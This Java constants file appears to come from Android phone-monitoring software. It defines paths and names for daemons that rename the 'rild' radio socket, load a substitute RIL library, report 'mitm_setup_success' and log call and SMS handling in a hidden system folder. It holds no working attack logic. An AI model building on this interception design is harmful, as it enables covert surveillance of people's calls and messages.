package com.vvt.callmanager.ref;

import android.net.Uri;

import com.vvt.shell.Shell;

public class BugDaemonResource {
	
	public static final String PACKAGE_NAME = "com.vvt.callmanager";
	
	public static final Uri URI_MITM_SETUP_SUCCESS = 
			Uri.parse("content://com.fx.callmgrd/mitm_setup_success");
	
	public static final Uri URI_STARTUP_SUCCESS = 
			Uri.parse("content://com.fx.callmgrd/startup_success");
	
	public static final String LIB_RIL = "fxril";
	public static final String LIB_RIL_FILE = String.format("lib%s.so", LIB_RIL);
	
	public static final String DEX_ZIP_FILENAME = "bugd.zip";
	public static final String SECURITY_CONFIG_FILE = "bugd-config.dat";
	
	public static final String EXTRACTING_PATH = "/data/misc/dm";
	static final String[] RESOURCE_FILENAMES = { DEX_ZIP_FILENAME, SECURITY_CONFIG_FILE };
	
	static final String NATIVE_LIBS_PATH = "/data/misc/dm";
	static final String[] NATIVE_LIB_FILENAMES = { Shell.LIB_EXEC_FILE, LIB_RIL_FILE };
	
	public static final String LOG_FOLDER = "/data/misc/dm";
	public static final String LOG_FILENAME = "fx.log";
	
	public static final String PROC_ANDROID_PHONE = "com.android.phone";
	
	public static final String SOCKET_PATH = "/dev/socket";
	public static final String ORIGINAL_SOCKET = "rild";
	public static final String TERMINAL_SOCKET = String.format("%sr", ORIGINAL_SOCKET);
	
	public static final long MONITOR_TIME_INTERVAL = 43*1000;
	
	public static final String RIL_SOCKET_ORIGINAL_PATH = 
		String.format("%s/%s", SOCKET_PATH, ORIGINAL_SOCKET);
	
	public static final String RIL_SOCKET_RENAMED_PATH = 
		String.format("%s/%s", SOCKET_PATH, TERMINAL_SOCKET);
	
	static final String AT_LOG_CALL_FILE = "call-handler.log";
	public static final String AT_LOG_CALL_PATH = 
			String.format("%s/%s", LOG_FOLDER, AT_LOG_CALL_FILE);
	
	static final String AT_LOG_SMS_FILE = "sms-handler.log";
	public static final String AT_LOG_SMS_PATH = 
			String.format("%s/%s", LOG_FOLDER, AT_LOG_SMS_FILE);

	
	public static class CallMgr {
		public static final String PROCESS_NAME = "callmgrd";
		
		public static final String STARTUP_SCRIPT_PATH = 
				String.format("%s/%s", EXTRACTING_PATH, PROCESS_NAME);
		
		static final String MAIN_CLASS = "com.vvt.callmanager.CallMgrDaemonMain";
		
		public static final String SOCKET_NAME = "com.fx.socket.callmgrd";
	}
	
	public static class CallMon {
		public static final String PROCESS_NAME = "callmond";
		
		public static final String STARTUP_SCRIPT_PATH = 
				String.format("%s/%s", EXTRACTING_PATH, PROCESS_NAME);
		
		static final String MAIN_CLASS = "com.vvt.callmanager.CallMonDaemonMain";
		
		public static final String SOCKET_NAME = "com.fx.socket.callmond";
	}
	
}
